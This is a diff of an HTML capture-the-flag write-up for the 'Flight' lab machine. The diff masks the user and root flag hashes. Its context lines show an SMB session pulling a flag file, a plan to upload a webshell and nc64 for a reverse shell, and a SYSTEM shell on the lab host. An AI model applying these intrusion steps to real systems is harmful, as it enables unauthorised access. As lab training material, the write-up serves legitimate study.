@@ -1706,7 +1706,7 @@ smb: \c.bum\Desktop\&gt; get user.txt
 getting file \c.bum\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 </code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-804f-8713-c46d09c62f0b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
 └─$ cat user.txt 
-0f2b3ac193fc1fc75e534bf70c5a6e97
+0******************************7
 </code></pre><h1 id="199d1b9f-8847-8127-a9eb-f8a2a213a15d" class="">Root</h1><h3 id="19fd1b9f-8847-800b-b109-c1ded8bcf1c0" class="">First, we need to get a reverse shell, let’s upload webshell and nc64 and execute command to reverse shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8073-a657-fa3c767fb6cf" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
 └─$ smbclient -U &#x27;c.bum&#x27;  -L \\10.10.11.187      
 Password for [WORKGROUP\c.bum]:
@@ -1956,5 +1956,5 @@ whoami
 nt authority\system
 c:\Users\Administrator\Desktop&gt;type root.txt
 type root.txt
-255e0e9592657e700c4aac7da1320c4b
+2******************************b
 </code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
